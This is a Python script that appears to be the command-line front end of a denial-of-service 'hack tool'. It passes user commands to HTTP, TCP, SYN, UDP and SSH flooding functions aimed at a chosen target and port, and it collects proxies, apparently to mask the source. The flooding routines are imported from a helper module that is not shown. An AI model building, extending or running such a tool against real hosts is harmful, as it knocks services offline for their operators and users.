import _thread
import os
import sys

from PyCoreHackToolUtils import *


def main():
    try:
        if not os.path.exists(SELF_CONF_PATH):
            f = open(SELF_CONF_PATH, 'x')
            initConfig(CONFIG)
            f.close()
    except:
        os.remove(SELF_CONF_PATH)
        f = open(SELF_CONF_PATH, 'x')
        initConfig(CONFIG)
        f.close()

    else:
        _thread.start_new_thread(resetToNewConfig, (CONFIG,))
    while True:
        cmd = str(input("PyCore@HackTool -> ")).split(" ")
        try:
            if cmd[0] == "atk":

                sendPacketAttack(toRequestUrl([cmd[1]]), int(str(cmd[2])), failnum=int(cmd[3]))
            elif cmd[0] == "exit":
                sys.exit("Exited.")

            elif cmd[0] == "ps":
                if cmd[1] == "clear":
                    try:
                        os.remove('./proxies.txt')
                    except:
                        pass

                elif cmd[1] == "get":
                    print(getProxies())
                elif cmd[1] == "to":
                    print(proxiesTo(cmd[2], cmd[3]))
            elif cmd[0] == "tcpatk":
                tcpAttack((cmd[1], int(cmd[2])), int(cmd[3]))
            elif cmd[0] == "fullatk":
                tcpAttack((cmd[1], int(cmd[2])), int(cmd[3]))
            elif cmd[0] == "synatk":

                synAttack(cmd[1], int(cmd[2]), cmd[3], int(cmd[4]), int(cmd[5]))
            elif cmd[0] == "bsynatk":

                synAttackBetter(cmd[1], cmd[2], int(cmd[3]))
            elif cmd[0] == "udpatk":

                udpAttack(cmd[1].lower().replace("http://", '').replace("https://", ''), int(cmd[2]), int(cmd[3]))
            elif cmd[0] == "sshatk":
                sshAttack(cmd[1], int(cmd[2]), int(cmd[3]))
            elif cmd[0] == "set":
                if cmd[1] == "reset":
                    initConfig(CONFIG)
            else:
                if cmd != '\n':
                    colormsg("Error command.", 'yellow')

        except (IndexError, ValueError, TypeError) as e:
            if e == "list index out of range":
                print("参数不完整。")
            else:
                print(f"Error:{e}")
                pass


main()
